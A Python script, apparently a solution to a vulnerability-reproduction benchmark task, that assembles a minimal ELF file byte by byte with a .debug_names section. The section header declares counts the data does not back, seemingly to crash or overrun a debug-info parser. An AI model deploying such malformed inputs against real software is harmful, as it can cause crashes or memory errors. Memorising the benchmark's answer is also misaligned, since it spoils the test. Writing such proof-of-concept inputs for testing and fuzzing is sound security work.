import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        shstrtab_size = len(shstrtab)
        debug_names_offset = 64 + shstrtab_size
        temp_content = (
            struct.pack('<H', 5) +
            struct.pack('<H', 0) +
            struct.pack('<I', 0) +
            struct.pack('<I', 1) +
            struct.pack('<I', 0) +
            struct.pack('<I', 2) +
            struct.pack('<I', 0) +
            struct.pack('<I', 0) +
            b'\x00' * 12
        )
        unit_length = len(temp_content)
        length_field = struct.pack('<I', unit_length)
        debug_names_content = length_field + temp_content
        debug_names_size = len(debug_names_content)
        shoff = 64 + shstrtab_size + debug_names_size
        shnum = 3
        shstrndx = 1
        elf_header = (
            b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
            struct.pack('<H', 1) +
            struct.pack('<H', 0x3E) +
            struct.pack('<I', 1) +
            struct.pack('<Q', 0) +
            struct.pack('<Q', 0) +
            struct.pack('<Q', shoff) +
            struct.pack('<I', 0) +
            struct.pack('<H', 64) +
            struct.pack('<H', 0) +
            struct.pack('<H', 0) +
            struct.pack('<H', 64) +
            struct.pack('<H', shnum) +
            struct.pack('<H', shstrndx)
        )
        null_sh = b'\x00' * 64
        shstrtab_sh = (
            struct.pack('<I', 1) +
            struct.pack('<I', 3) +
            b'\x00' * 8 +
            b'\x00' * 8 +
            struct.pack('<Q', 64) +
            struct.pack('<Q', shstrtab_size) +
            b'\x00' * 4 +
            b'\x00' * 4 +
            b'\x00' * 7 + b'\x01' +
            b'\x00' * 8
        )
        debug_sh = (
            struct.pack('<I', 11) +
            struct.pack('<I', 7) +
            b'\x00' * 8 +
            b'\x00' * 8 +
            struct.pack('<Q', debug_names_offset) +
            struct.pack('<Q', debug_names_size) +
            b'\x00' * 4 +
            b'\x00' * 4 +
            b'\x00' * 7 + b'\x01' +
            b'\x00' * 8
        )
        section_headers = null_sh + shstrtab_sh + debug_sh
        file_bytes = (
            elf_header +
            shstrtab +
            debug_names_content +
            section_headers
        )
        return file_bytes